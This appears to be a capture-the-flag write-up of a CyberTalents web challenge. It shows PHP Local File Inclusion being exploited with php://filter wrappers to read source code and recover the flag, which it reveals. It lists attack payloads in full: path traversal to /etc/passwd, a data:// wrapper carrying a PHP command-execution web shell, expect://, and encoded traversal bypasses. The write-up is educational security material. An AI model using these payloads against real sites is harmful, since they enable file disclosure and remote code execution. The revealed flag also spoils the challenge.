Dark Project - 100 Points
Platform: CyberTalents
Category: Web Security
Difficulty: Medium
Date Solved: December 14, 2024

📋 Challenge Description
A web application with multiple pages accessible through URL parameters. The goal is to find and exploit a vulnerability to retrieve the flag.
Challenge URL: http://cdcamxwl32pue3e6m14nzyr6cn3kme435ng0kb8z5-web.cybertalentslabs.com/
Files Provided: None

🔍 Initial Reconnaissance
First Observations

Main page has navigation links for: Projects, About, Contact
URL structure uses a home parameter: index.php?home=projects
When navigating to different pages, the home parameter changes:

About page: ?home=about
Contact page: ?home=contact
Projects page: ?home=projects


No login forms or visible input fields on the page
Page source inspection revealed nothing unusual

Tools Used

Browser DevTools (Inspect Element, Network tab)
View Page Source (Ctrl+U)

Information Gathered
The home parameter controlling page content is a classic indicator of potential Local File Inclusion (LFI) vulnerability. The server likely uses PHP's include() function with user-supplied input.

🎯 Vulnerability Identification
Suspected Vulnerability: Local File Inclusion (LFI)
Why I Suspected This

URL parameter directly controls which page is loaded
Common PHP pattern: include($_GET['home'] . '.php')
No apparent input validation visible in the client-side code
This is a common CTF web vulnerability pattern

Research Done

Reviewed OWASP documentation on LFI
Researched PHP filter wrapper techniques
Consulted PayloadsAllTheThings LFI section


🚀 Exploitation Process
Attempt 1: Basic Path Traversal
Payload:
?home=../../../etc/passwd
?home=../../../../etc/passwd
?home=../../../../../etc/passwd
Result: ❌ Failed
Why it failed:
The application has filters in place that block basic path traversal attempts using ../ sequences. This is a common security measure, but not foolproof.

Attempt 2: PHP Filter Wrapper (Success!)
Payload:
?home=php://filter/convert.base64-encode/resource=index
Result: ✅ Success!
Why it succeeded:

PHP filter wrappers bypass path traversal filters because they use a different mechanism
The php://filter wrapper is a built-in PHP feature for applying filters to streams
Base64 encoding prevents PHP from executing the code, allowing us to read the raw source
The server still appends .php to our input, resulting in: php://filter/convert.base64-encode/resource=index.php

Response:
The page source contained a long base64-encoded string representing the PHP source code of index.php.

💡 Solution
Final Exploit
Step 1: Use PHP filter wrapper to retrieve encoded source
http://cdcamxwl32pue3e6m14nzyr6cn3kme435ng0kb8z5-web.cybertalentslabs.com/index.php?home=php://filter/convert.base64-encode/resource=index
Step 2: View page source (Ctrl+U or Right-click → View Page Source)
Look for the base64-encoded string in the HTML output.
Step 3: Decode the base64 string
bash# Using command line
echo "PD9waHAg..." | base64 -d

# Or use online tool: https://www.base64decode.org/
# Or browser console: atob("PD9waHAg...")
Step 4: Find the flag in the decoded PHP source code
Flag {pHp_Wr4P3rs_4r3_Us3fuL}

📖 Key Learnings
Technical Concepts
PHP Stream Wrappers:

PHP has built-in protocols like php://, data://, expect:// for accessing various data streams
These are legitimate features but can be abused when user input isn't properly validated
php://filter allows applying filters (like base64 encoding) to file content before it's processed

Why Base64 Encoding Works:

Normally, when PHP includes a .php file, it executes the code
By base64-encoding it first, PHP treats it as data instead of executable code
This lets us read the raw source code, including comments, variables, and flags

Filter Bypass Techniques:

Security filters often focus on blocking specific patterns (like ../)
Alternative methods (like PHP wrappers) can bypass pattern-based filters
Defense requires whitelisting valid inputs, not just blacklisting dangerous ones

New Techniques Learned

PHP Filter Wrapper Exploitation - Using php://filter to bypass LFI protections
Base64 Encoding for Source Disclosure - Preventing code execution to read source files
LFI Enumeration - Testing different wrapper protocols when basic attacks fail

Mistakes & What I Learned

Mistake: Initially only tried path traversal without considering alternative methods

Lesson: When one attack vector is blocked, always try alternative approaches (wrappers, encodings, etc.)


Mistake: Almost gave up when basic LFI payloads didn't work

Lesson: Filters are common in CTFs - they're hints to try more advanced techniques




🔄 Alternative Solutions
Method 2: ROT13 Filter
Instead of base64, you could use ROT13 encoding:
?home=php://filter/read=string.rot13/resource=index
This applies ROT13 cipher to the source code, which can then be decoded.
Method 3: Other Resources
Try reading other PHP files that might contain the flag:
?home=php://filter/convert.base64-encode/resource=config
?home=php://filter/convert.base64-encode/resource=flag
?home=php://filter/convert.base64-encode/resource=about

💻 Commands & Scripts Used
Useful One-Liners
bash# Decode base64 (Linux/Mac)
echo "base64_string_here" | base64 -d

# Decode base64 (using Python)
python3 -c "import base64; print(base64.b64decode('base64_string_here').decode())"

# Using curl to fetch and decode in one command
curl -s "http://[url]/?home=php://filter/convert.base64-encode/resource=index" | grep -oP 'base64_pattern' | base64 -d
Browser Console Method
javascript// In browser console (F12)
let encoded = "PD9waHAg..."; // Your base64 string
let decoded = atob(encoded);
console.log(decoded);

🎓 Recommendations for Similar Challenges
If you encounter URL parameters loading files:

First, test for basic LFI

Try ../../../etc/passwd
Try variations with different traversal depths


If blocked, try PHP wrappers

php://filter/convert.base64-encode/resource=filename
php://filter/read=string.rot13/resource=filename
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id (requires expect extension)


Try reading different files

index, config, flag, about, admin
Look for common configuration file names


Check for other encoding/bypass techniques

URL encoding: ..%2F..%2F..%2F
Double encoding: ..%252F..%252F
Mixed encoding: ....//....//



Red flags to watch for:

URL parameters that appear to load pages: ?page=, ?file=, ?home=, ?include=
Error messages revealing file paths
Different responses when requesting non-existent files vs. blocked files


🔗 References & Resources
Documentation

PHP Stream Wrappers
PHP Filter Functions

Articles & Writeups

OWASP - Testing for Local File Inclusion
PayloadsAllTheThings - File Inclusion
HackTricks - File Inclusion/Path Traversal

Tools Used

Browser DevTools - Built-in browser developer tools
CyberChef - For encoding/decoding operations
Base64 Decode - Online base64 decoder


🏷️ Tags
#web #lfi #php #file-inclusion #php-wrappers #base64 #cybertalents #easy


